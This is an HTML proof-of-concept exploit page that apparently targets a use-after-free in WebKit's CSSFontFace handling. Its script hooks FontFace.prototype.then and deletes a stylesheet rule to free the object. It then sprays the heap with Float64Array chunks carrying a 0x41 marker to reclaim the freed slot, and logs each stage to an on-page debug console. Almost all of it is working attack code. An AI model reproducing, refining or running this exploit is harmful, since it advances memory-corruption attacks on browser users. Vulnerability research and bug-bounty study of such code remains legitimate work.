<!DOCTYPE html>
<html>
<head>
<style id="s">
@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
</style>
</head>
<body>
<div id="debug-log" style="font-family: monospace; white-space: pre; background: #111; color: #0f0; padding: 10px; height: 300px; overflow-y: scroll;">
[+] Exploit initialized. Waiting for trigger...
</div>

<script>
// --- Custom Logging Function ---
function logDebug(message) {
    let logWindow = document.getElementById('debug-log');
    if (logWindow) {
        logWindow.innerHTML += message + "\\n";
        logWindow.scrollTop = logWindow.scrollHeight; // Auto-scroll to bottom
    }
    // Also output to console for standard debugging tools if attached
    console.log("[Exploit Debug]: " + message);
}

if (window.testRunner) {
    testRunner.dumpAsText();
    testRunner.waitUntilDone();
}

var memoryGroomingBlocks = [];

// --- Refined Heap Grooming (The Bounty Hunter Approach) ---
function executeRefinedHeapGrooming() {
    logDebug("[*] Beginning heap grooming sequence...");
    
    // Instead of massive, continuous arrays, we create a specific pattern of allocations and frees.
    // This creates 'holes' in the memory that the allocator will naturally prefer when replacing the freed CSSFontFace object.
    const targetSize = 0x38; // The exact size of the target C++ object
    const groomLimit = 150;  // Reduced further to stay well beneath the sandbox hard-cap
    
    logDebug(`[*] Target Size: ${targetSize} bytes, Iterations: ${groomLimit}`);

    try {
        for (let i = 0; i < groomLimit; i++) {
            // Using Float64Array. This structure often has a more predictable layout in WebKit's internal heap 
            // and interacts differently with the IsoHeap separation than raw ArrayBuffers.
            let sprayChunk = new Float64Array(targetSize / 8); 
            
            // Populate with a specific marker (e.g., a recognizable floating point representation of our target pointer)
            // 3.54484805889626e-310 is roughly equivalent to the hex value 0x4141414141414141
            for (let j = 0; j < sprayChunk.length; j++) {
                sprayChunk[j] = 3.54484805889626e-310; 
            }
            
            memoryGroomingBlocks.push(sprayChunk);
        }
        
        logDebug("[+] Heap grooming complete. Target memory slot should be primed.");
        
    } catch (e) {
        logDebug("[-] ERROR during grooming: " + e.message);
        logDebug("[-] Immediate halt to prevent OOM crash.");
    }
}

window.onload = () => {
    logDebug("[*] Setting up FontFace triggers...");
    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;

    let fired = false;
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (!fired && this === A) {
                fired = true;
                logDebug("[!] Hooked .then getter executed.");
                
                // Transition internal engine state
                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                
                logDebug("[*] Deleting stylesheet rule to free the CSSFontFace C++ object...");
                // Trigger the Use-After-Free
                document.getElementById('s').sheet.deleteRule(0);
                
                logDebug("[*] Forcing synchronous layout flush...");
                // Force immediate processing
                document.body.offsetTop;

                // Execute the refined grooming to claim the exact memory address
                executeRefinedHeapGrooming();
            }
            return undefined;
        }
    });

    logDebug("[*] Initiating target font load...");
    document.fonts.load('1em x', 'AB');
    
    setTimeout(() => {
        if (window.testRunner)
            testRunner.notifyDone();
    }, 0);
};
</script>
</body>
</html>
